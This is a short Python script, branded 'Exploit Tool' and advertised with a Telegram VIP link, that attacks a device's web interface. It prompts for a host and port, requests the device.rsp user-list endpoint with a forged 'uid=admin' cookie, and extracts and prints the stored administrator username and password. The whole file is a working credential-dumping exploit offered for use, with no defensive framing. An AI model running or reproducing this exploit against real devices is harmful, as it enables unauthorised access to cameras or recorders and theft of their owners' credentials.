#!/bin/python

import os, requests, re, time
from colorama import Fore, Style

def banner():
    print(f"{Fore.YELLOW}Exploit Tool")
    print(f"{Fore.YELLOW}made in {Fore.RED}: {Fore.GREEN}yenyangmjaze ")
    print(f"{Fore.YELLOW}link {Fore.RED}: {Fore.WHITE}https://t.me/+Oiy2q9Y5Zfo0NTg0 ")
    print(f"{Fore.YELLOW}telegarm {Fore.RED}: VIP ")
    from datetime import date
    today = date.today()
    print("Date:", today)

os.system('clear')

headers = {}
banner()

host = input(f"{Fore.GREEN}Host{Fore.WHITE}> ")
port = input(f"{Fore.GREEN}Port{Fore.WHITE}> ")

os.system('clear')

forexe = (f"http://{host}:{port}/device.rsp?opt=user&cmd=list")
forchk = (f"http://{host}:{port}/")

def Headers(xCookie):
    headers["Host"]             =  forchk
    headers["User-Agent"]       = "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
    headers["Accept"]           = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
    headers["Accept-Languag"]   = "es-AR,en-US;q=0.7,en;q=0.3"
    headers["Connection"]       = "close"
    headers["Content-Type"]     = "text/html"
    headers["Cookie"]           = "uid="+xCookie
    
    return headers

req = requests.get(forexe, headers=Headers(xCookie="admin"), timeout=10.000).text
user = re.findall(r'"uid":"(.*?)"', req)[0]
pswd = re.findall(r'"pwd":"(.*?)"', req)[0]



banner()
print(f"\n       {Fore.WHITE}- {Fore.YELLOW}Result {Fore.WHITE}-   ")
print(f"{Fore.YELLOW} Execution :{Fore.RED} {host}:{port}")
print(f"    {Fore.BLUE}[{Fore.GREEN}!{Fore.BLUE}] {Fore.YELLOW}Username : {Fore.WHITE}{user}")
print(f"    {Fore.BLUE}[{Fore.GREEN}!{Fore.BLUE}] {Fore.YELLOW}Password : {Fore.WHITE}{pswd}")